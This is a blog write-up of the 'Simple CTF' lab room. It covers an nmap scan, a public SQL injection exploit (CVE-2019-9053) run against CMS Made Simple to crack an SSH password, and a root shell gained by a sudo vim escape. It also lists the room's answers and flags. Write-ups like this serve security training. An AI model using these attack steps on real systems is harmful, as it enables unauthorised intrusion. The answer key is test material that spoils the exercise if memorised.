---
date: 2021-04-29
title: "Simple CTF Write-up"
draft: false
url: "/writeups/SimpleCTF"
categories: ["Write-ups"]
authors:
- name: "Sina "NEXN" JB
linktitle: SimpleCTF write-up - itsNexn
title: SimpleCTF write-up - itsNexn
weight: 1
---

## Nmap Scan
nmap:

```
# Nmap 7.91 scan initiated Wed Apr 28 23:52:46 2021 as: nmap -sC -sV -oN scans/nmap 10.10.47.203
Nmap scan report for 10.10.47.203
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.197.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries
|_/ /openemr-5_0_1_3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 28 23:53:38 2021 -- 1 IP address (1 host up) scanned in 51.93 seconds.
```
after nmap scan i just realize theres a cms in `/simple` and after scroll a bit:
```
© Copyright 2004 - 2021 - CMS Made Simple
This site is powered by CMS Made Simple version 2.2.8
```
and in `searchsploit` i found theres a `sqli` and i just download the exploit ...

Command:
```bash
python2.7 sq1i.py -u http://10.10.160.249/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```


### Tasks

- How many services are running under port 1000?
```
3
```

- What is running on the higher port?
```
ssh
```

- What's the CVE you're using against the application?
```
CVE-2019-9053
```

- To what kind of vulnerability is the application vulnerable?
```
sqli
```

## SQL Injection

after finding the vulnerability against the application we can now exploit it...

so we download the python2 exploit and then we can start after running exploit
with seclists `/usr/share/seclists/Passwords/Common-Credentials/best110.txt`and the

Command:
```bash
python2 sq1i.py -u http://10.10.31.164/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt
```

we found these creds:
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

### Tasks

- What's the password?
```
secret
```

- Where can you login with the details obtained?
```
ssh
```

## SSH

we logged in as `mitch:secret` and we found out theres a `user.txt` on home directory

### Tasks

- What's the user flag?
```
G00d j0b, keep up!
```

- Is there any other user in the home directory? What's its name?
```
sunbatch
```

## Privilege escalation

the easiest way to Privilege escalation is running the linpeas ...

after setup a python http server and get the shell script with `wget`
we can now run it.

**oHHHH yes we can run vim as root without password**
so we can use `GTFOBins` to find the way :
```bash
vim -c ':!/bin/sh'
```
so we got root shell we can now read `/root/root.txt`

### Tasks

- What can you leverage to spawn a privileged shell?
```
vim
```

- What's the root flag?
```
W3ll d0n3. You made it!
```
